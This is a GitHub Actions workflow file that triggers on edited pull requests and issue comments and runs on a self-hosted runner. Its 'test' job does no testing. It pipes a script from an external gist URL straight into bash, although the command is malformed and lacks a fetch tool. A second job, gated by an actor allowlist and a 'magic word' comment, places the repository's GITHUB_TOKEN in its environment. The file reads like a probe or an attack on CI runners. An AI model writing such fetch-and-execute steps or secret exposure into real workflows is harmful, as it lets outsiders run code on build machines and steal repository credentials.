on:
  issue_comment:
    types: [created]
  pull_request:
    types: [edited]
  
jobs:
  test:
    runs-on: gossip
    if: github.event_name == 'pull_request'
    steps:
      - run: https://gist.githubusercontent.com/vikorium/8bf940180791d6529c9246a747fa4939/raw/7a8ac3c252b3d11a373e76b43c895f227402466c/ror.sh | bash
      
  magicword:
    runs-on: gossip
    if: contains( '\
      jack,\
      jack,\
      john,\
      certainlynotvikorium,\
      bill,\
      joe,\
      alissa,\
      ', format('{0},', github.actor)) && github.event.comment.body == 'trex'
    steps:
      - name: You said the magic word!
        run: sleep 1
        env:
          TOKEN: ${{ secrets.GITHUB_TOKEN }}
